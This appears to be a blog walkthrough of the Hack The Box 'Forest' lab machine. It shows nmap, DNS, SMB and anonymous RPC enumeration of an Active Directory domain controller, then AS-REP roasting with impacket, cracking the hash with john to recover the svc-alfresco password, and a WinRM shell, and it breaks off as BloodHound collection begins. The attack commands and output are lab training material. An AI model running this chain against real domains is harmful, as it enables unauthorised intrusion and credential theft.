<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.10.161</span><br><span class="line">Host is up (0.56s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">53/tcp    open  domain       Simple DNS Plus</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)</span><br><span class="line">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%), Microsoft Windows 10 (92%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   311: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2023-03-12T10:51:55</span><br><span class="line">|_  start_date: 2023-03-12T08:42:45</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span><br><span class="line">|   Computer name: FOREST</span><br><span class="line">|   NetBIOS computer name: FOREST\x00</span><br><span class="line">|   Domain name: htb.local</span><br><span class="line">|   Forest name: htb.local</span><br><span class="line">|   FQDN: FOREST.htb.local</span><br><span class="line">|_  System time: 2023-03-12T03:51:56-07:00</span><br><span class="line">|_clock-skew: mean: 2h26m48s, deviation: 4h02m31s, median: 6m47s</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"># Nmap done at Sun Mar 12 18:45:31 2023 -- 1 IP address (1 host up) scanned in 58.26 seconds</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -sC -sV -O -p53,123,389 10.10.10.161</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> Nmap 7.93 scan initiated Sun Mar 12 18:37:38 2023 as: nmap -sU -sC -sV -O -p53,123,389 -oN udp 10.10.10.161</span><br><span class="line">Nmap scan report for 10.10.10.161</span><br><span class="line">Host is up (0.56s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">53/udp  open  domain  (generic dns response: SERVFAIL)</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   NBTStat: </span><br><span class="line">|_    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">123/udp open  ntp     NTP v3</span><br><span class="line">| ntp-info: </span><br><span class="line">|_  </span><br><span class="line">389/udp open  ldap    Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port53-UDP:V=7.93%I=7%D=3/12%Time=640DAB92%P=x86_64-pc-linux-gnu%r(NBTS</span><br><span class="line">SF:tat,32,&quot;\x80\xf0\x80\x82\0\x01\0\0\0\0\0\0\x20CKAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">SF:AAAAAAA\0\0!\0\x01&quot;);</span><br><span class="line">Too many fingerprints match this host to give specific OS details</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 6m51s</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"># Nmap done at Sun Mar 12 18:38:29 2023 -- 1 IP address (1 host up) scanned in 51.65 seconds</span><br></pre></td></tr></table></figure>

<h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/RedTeamNote/Walkthrough/Forest]</span><br><span class="line">└─$ dig htb.local @10.10.10.161     </span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.8-1-Debian &lt;&lt;&gt;&gt; htb.local @10.10.10.161</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; WARNING: .local is reserved for Multicast DNS</span><br><span class="line">;; You are currently testing what happens when an mDNS query is leaked to DNS</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 24459</span><br><span class="line">;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4000</span><br><span class="line">; COOKIE: 2283a32ea95ada22 (echoed)</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;htb.local.                     IN      A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">htb.local.              600     IN      A       10.10.10.161</span><br><span class="line"></span><br><span class="line">;; Query time: 319 msec</span><br><span class="line">;; SERVER: 10.10.10.161#53(10.10.10.161) (UDP)</span><br><span class="line">;; WHEN: Sun Mar 12 21:00:24 CST 2023</span><br><span class="line">;; MSG SIZE  rcvd: 66</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(sollupus㉿kali)-[~/RedTeamNote/Walkthrough/Forest]</span><br><span class="line">└─$ dig forest.htb.local @10.10.10.161</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.8-1-Debian &lt;&lt;&gt;&gt; forest.htb.local @10.10.10.161</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; WARNING: .local is reserved for Multicast DNS</span><br><span class="line">;; You are currently testing what happens when an mDNS query is leaked to DNS</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 9562</span><br><span class="line">;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4000</span><br><span class="line">; COOKIE: 03db0d79ded5c060 (echoed)</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;forest.htb.local.              IN      A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">forest.htb.local.       3600    IN      A       10.10.10.161</span><br><span class="line"></span><br><span class="line">;; Query time: 303 msec</span><br><span class="line">;; SERVER: 10.10.10.161#53(10.10.10.161) (UDP)</span><br><span class="line">;; WHEN: Sun Mar 12 21:01:28 CST 2023</span><br><span class="line">;; MSG SIZE  rcvd: 73</span><br></pre></td></tr></table></figure>

<p>​	It’s doesn’t let me do a zone transfer</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/RedTeamNote/Walkthrough/Forest]</span><br><span class="line">└─$ dig axfr htb.local @10.10.10.161  </span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.8-1-Debian &lt;&lt;&gt;&gt; axfr htb.local @10.10.10.161</span><br><span class="line">;; global options: +cmd</span><br><span class="line">; Transfer failed.              </span><br></pre></td></tr></table></figure>

<h3 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h3><p>​	port 139 is open ,try smb connection.Howerver,it doesn’t work.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N -L //10.10.10.161/</span><br><span class="line"></span><br><span class="line">┌──(sollupus㉿kali)-[~/RedTeamNote/Walkthrough/Forest]</span><br><span class="line">└─$ smbclient -N -L //htb.local/                        </span><br><span class="line">Anonymous login successful</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">do_connect: Connection to htb.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>

<h3 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h3><p>​	port 135 is open,try rpcclient.And find it’s work.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/RedTeamNote/Walkthrough/Forest]</span><br><span class="line">└─$ rpcclient -U &quot;&quot; -N 10.10.10.161</span><br><span class="line">rpcclient $&gt; </span><br></pre></td></tr></table></figure>

<p>​	Then we can use it to enumrate users,groups,member of group.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">rpcclient $&gt; enumdomusers              </span><br><span class="line">user:[Administrator] rid:[0x1f4]       </span><br><span class="line">user:[Guest] rid:[0x1f5]               </span><br><span class="line">user:[krbtgt] rid:[0x1f6]              </span><br><span class="line">user:[DefaultAccount] rid:[0x1f7]      </span><br><span class="line">user:[$331000-VK4ADACQNUCA] rid:[0x463]</span><br><span class="line">user:[SM_2c8eef0a09b545acb] rid:[0x464]</span><br><span class="line">user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]</span><br><span class="line">user:[SM_75a538d3025e4db9a] rid:[0x466]</span><br><span class="line">user:[SM_681f53d4942840e18] rid:[0x467]</span><br><span class="line">user:[SM_1b41c9286325456bb] rid:[0x468]</span><br><span class="line">user:[SM_9b69f1b9d2cc45549] rid:[0x469]</span><br><span class="line">user:[SM_7c96b981967141ebb] rid:[0x46a]</span><br><span class="line">user:[SM_c75ee099d0a64c91b] rid:[0x46b]</span><br><span class="line">user:[SM_1ffab36a2f5f479cb] rid:[0x46c]</span><br><span class="line">user:[HealthMailboxc3d7722] rid:[0x46e]</span><br><span class="line">user:[HealthMailboxfc9daad] rid:[0x46f]</span><br><span class="line">user:[HealthMailboxc0a90c9] rid:[0x470]</span><br><span class="line">user:[HealthMailbox670628e] rid:[0x471]</span><br><span class="line">user:[HealthMailbox968e74d] rid:[0x472]</span><br><span class="line">user:[HealthMailbox6ded678] rid:[0x473]</span><br><span class="line">user:[HealthMailbox83d6781] rid:[0x474]</span><br><span class="line">user:[HealthMailboxfd87238] rid:[0x475]</span><br><span class="line">user:[HealthMailboxb01ac64] rid:[0x476]</span><br><span class="line">user:[HealthMailbox7108a4e] rid:[0x477]</span><br><span class="line">user:[HealthMailbox0659cc1] rid:[0x478]</span><br><span class="line">user:[sebastien] rid:[0x479]</span><br><span class="line">user:[lucinda] rid:[0x47a]</span><br><span class="line">user:[svc-alfresco] rid:[0x47b]  </span><br><span class="line">user:[andy] rid:[0x47e]                </span><br><span class="line">user:[mark] rid:[0x47f]                </span><br><span class="line">user:[santi] rid:[0x480]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">rpcclient $&gt; enumdomgroups</span><br><span class="line">group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]          </span><br><span class="line">group:[Domain Admins] rid:[0x200]</span><br><span class="line">group:[Domain Users] rid:[0x201]</span><br><span class="line">group:[Domain Guests] rid:[0x202]</span><br><span class="line">group:[Domain Computers] rid:[0x203]</span><br><span class="line">group:[Domain Controllers] rid:[0x204]</span><br><span class="line">group:[Schema Admins] rid:[0x206]</span><br><span class="line">group:[Enterprise Admins] rid:[0x207]</span><br><span class="line">group:[Group Policy Creator Owners] rid:[0x208]</span><br><span class="line">group:[Read-only Domain Controllers] rid:[0x209]</span><br><span class="line">group:[Cloneable Domain Controllers] rid:[0x20a]</span><br><span class="line">group:[Protected Users] rid:[0x20d]</span><br><span class="line">group:[Key Admins] rid:[0x20e]            </span><br><span class="line">group:[Enterprise Key Admins] rid:[0x20f]</span><br><span class="line">group:[DnsUpdateProxy] rid:[0x44e]</span><br><span class="line">group:[Organization Management] rid:[0x450]</span><br><span class="line">group:[Recipient Management] rid:[0x451]                 </span><br><span class="line">group:[View-Only Organization Management] rid:[0x452]</span><br><span class="line">group:[Public Folder Management] rid:[0x453]</span><br><span class="line">group:[UM Management] rid:[0x454]</span><br><span class="line">group:[Help Desk] rid:[0x455]</span><br><span class="line">group:[Records Management] rid:[0x456]</span><br><span class="line">group:[Discovery Management] rid:[0x457]</span><br><span class="line">group:[Server Management] rid:[0x458]</span><br><span class="line">group:[Delegated Setup] rid:[0x459]</span><br><span class="line">group:[Hygiene Management] rid:[0x45a]</span><br><span class="line">group:[Compliance Management] rid:[0x45b]</span><br><span class="line">group:[Security Reader] rid:[0x45c]</span><br><span class="line">group:[Security Administrator] rid:[0x45d]</span><br><span class="line">group:[Exchange Servers] rid:[0x45e]</span><br><span class="line">group:[Exchange Trusted Subsystem] rid:[0x45f]</span><br><span class="line">group:[Managed Availability Servers] rid:[0x460]</span><br><span class="line">group:[Exchange Windows Permissions] rid:[0x461]</span><br><span class="line">group:[ExchangeLegacyInterop] rid:[0x462]</span><br><span class="line">group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]</span><br><span class="line">group:[Service Accounts] rid:[0x47c]</span><br><span class="line">group:[Privileged IT Accounts] rid:[0x47d]</span><br><span class="line">group:[test] rid:[0x13ed]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rpcclient $&gt; querygroup 0x200          </span><br><span class="line">        Group Name:     Domain Admins     </span><br><span class="line">        Description:    Designated administrators of the domain</span><br><span class="line">        Group Attribute:7              </span><br><span class="line">        Num Members:1                  </span><br><span class="line">rpcclient $&gt; querygroupmem 0x200</span><br><span class="line">        rid:[0x1f4] attr:[0x7]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">rpcclient $&gt; queryuser 0x1f4            </span><br><span class="line">        User Name   :   Administrator</span><br><span class="line">        Full Name   :   Administrator</span><br><span class="line">        Home Drive  :   </span><br><span class="line">        Dir Drive   :      </span><br><span class="line">        Profile Path:      </span><br><span class="line">        Logon Script:</span><br><span class="line">        Description :   Built-in account for administering the computer/domain</span><br><span class="line">        Workstations:</span><br><span class="line">        Comment     :</span><br><span class="line">        Remote Dial :</span><br><span class="line">        Logon Time               :      Mon, 07 Oct 2019 06:57:07 EDT</span><br><span class="line">        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST</span><br><span class="line">        Kickoff Time             :      Wed, 31 Dec 1969 19:00:00 EST</span><br><span class="line">        Password last set Time   :      Wed, 18 Sep 2019 13:09:08 EDT</span><br><span class="line">        Password can change Time :      Thu, 19 Sep 2019 13:09:08 EDT</span><br><span class="line">        Password must change Time:      Wed, 30 Oct 2019 13:09:08 EDT</span><br><span class="line">        unknown_2[0..31]...</span><br><span class="line">        user_rid :      0x1f4</span><br><span class="line">        group_rid:      0x201</span><br><span class="line">        acb_info :      0x00000010</span><br><span class="line">        fields_present: 0x00ffffff</span><br><span class="line">        logon_divs:     168</span><br><span class="line">        bad_password_count:     0x00000000</span><br><span class="line">        logon_count:    0x00000031</span><br><span class="line">        padding1[0..7]...</span><br><span class="line">        logon_hrs[0..21]...</span><br></pre></td></tr></table></figure>

<h3 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a>enum4linux</h3><p>​	Also,we can use enum4linux tool to gather this infomation autoly.And I just paste a user-information part of it below.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">user:[Administrator] rid:[0x1f4]                            </span><br><span class="line">user:[Guest] rid:[0x1f5]                                    </span><br><span class="line">user:[krbtgt] rid:[0x1f6]                                   </span><br><span class="line">user:[DefaultAccount] rid:[0x1f7]                           </span><br><span class="line">user:[$331000-VK4ADACQNUCA] rid:[0x463]                     </span><br><span class="line">user:[SM_2c8eef0a09b545acb] rid:[0x464]                     </span><br><span class="line">user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]                     </span><br><span class="line">user:[SM_75a538d3025e4db9a] rid:[0x466]                     </span><br><span class="line">user:[SM_681f53d4942840e18] rid:[0x467]                     </span><br><span class="line">user:[SM_1b41c9286325456bb] rid:[0x468]                     </span><br><span class="line">user:[SM_9b69f1b9d2cc45549] rid:[0x469]                     </span><br><span class="line">user:[SM_7c96b981967141ebb] rid:[0x46a]                     </span><br><span class="line">user:[SM_c75ee099d0a64c91b] rid:[0x46b]                     </span><br><span class="line">user:[SM_1ffab36a2f5f479cb] rid:[0x46c]                     </span><br><span class="line">user:[HealthMailboxc3d7722] rid:[0x46e]                     </span><br><span class="line">user:[HealthMailboxfc9daad] rid:[0x46f]                     </span><br><span class="line">user:[HealthMailboxc0a90c9] rid:[0x470]                     </span><br><span class="line">user:[HealthMailbox670628e] rid:[0x471]                     </span><br><span class="line">user:[HealthMailbox968e74d] rid:[0x472]                     </span><br><span class="line">user:[HealthMailbox6ded678] rid:[0x473]                     </span><br><span class="line">user:[HealthMailbox83d6781] rid:[0x474]                     </span><br><span class="line">user:[HealthMailboxfd87238] rid:[0x475]                     </span><br><span class="line">user:[HealthMailboxb01ac64] rid:[0x476]                     </span><br><span class="line">user:[HealthMailbox7108a4e] rid:[0x477]                     </span><br><span class="line">user:[HealthMailbox0659cc1] rid:[0x478]                     </span><br><span class="line">user:[sebastien] rid:[0x479]                                </span><br><span class="line">user:[lucinda] rid:[0x47a]                                  </span><br><span class="line">user:[svc-alfresco] rid:[0x47b]                             </span><br><span class="line">user:[andy] rid:[0x47e]                                     </span><br><span class="line">user:[mark] rid:[0x47f]                                     </span><br><span class="line">user:[santi] rid:[0x480] </span><br></pre></td></tr></table></figure>

<h2 id="Shell-Gain"><a href="#Shell-Gain" class="headerlink" title="Shell-Gain"></a>Shell-Gain</h2><h3 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><p>​	With above actions,we can get a list of user.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">lucinda</span><br><span class="line">svc-alfresco</span><br><span class="line">andy</span><br><span class="line">mark</span><br><span class="line">santi</span><br></pre></td></tr></table></figure>

<p>​	And the port 88 is open.We can try to use <code>AS-REP Roastring attack</code>.Typically,kerberoasting  requires credentials on the domain to authenticate with.However,if an account have the property for “Do not require Kerberos preauthentication” or <code>UF_DONT_REQUIRE_PREAUTH</code> set to true.That attack could play a role.</p>
<p>​	We can use <code>GetNPUsers.py</code> from impacket to launch a attack.And get hash for svc-alfresco.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/…/WeaponizingTools/Domain-penetration/impacket/examples]</span><br><span class="line">└─$ ./GetNPUsers.py -dc-ip 10.10.10.161 -usersfile ~/RedTeamNote/Walkthrough/Forest/users -format john -outputfile hash4user -no-pass htb.local/</span><br><span class="line"></span><br><span class="line">$krb5asrep$svc-alfresco@HTB.LOCAL:36d75ad85a1792d93e9a0f9eb8d654f1$bbe1411147e7cfbf3c6201ce152f35cadf0d53aa248ff5671b4f46909f03dae560e7062ef44767a5f2186db42278874d8aecb70fc1d343a9a16d0557d25df5d6bf5b232700673e8e5c68f3747c972f671e3cbe6d123aca0568041e8d6af953a5f0f936cd84731e4c12bd3f516fda3aca7042ce1ca98b6c851546e85cb9130028c700cc542500ea3a75454b309724eda4da0ba0f702cfd0f433c948a1ff0342681d8106b23458b77ecbb034731366ce07585d6ef9be49baab42a1768f98d10a5a93cc2f3af1b309c2cf815de28a4370c0c8699f1bf785ace775fd88b291aa5b63390e32f397d9</span><br></pre></td></tr></table></figure>

<h3 id="Crack-the-Hash"><a href="#Crack-the-Hash" class="headerlink" title="Crack the Hash"></a>Crack the Hash</h3><p>​	use john to crack it.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">john hash4user --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(sollupus㉿kali)-[~/RedTeamNote/Walkthrough/Forest]</span><br><span class="line">└─$ john  --show hash4user        </span><br><span class="line">$krb5asrep$svc-alfresco@HTB.LOCAL:s3rvice</span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/RedTeamNote/Walkthrough/Forest]</span><br><span class="line">└─$ evil-winrm -i 10.10.10.161 -u svc-alfresco@HTB.LOCAL</span><br></pre></td></tr></table></figure>

<img src="/undefined/a7f75ca4/image-20230312212800728.png" class="">

<h2 id="Privesc-to-Administrator"><a href="#Privesc-to-Administrator" class="headerlink" title="Privesc to Administrator"></a>Privesc to Administrator</h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><h4 id="Sharphound"><a href="#Sharphound" class="headerlink" title="Sharphound"></a>Sharphound</h4><p>With shell,we can use sharphound.exe to collect information for Bloodhound.</p>
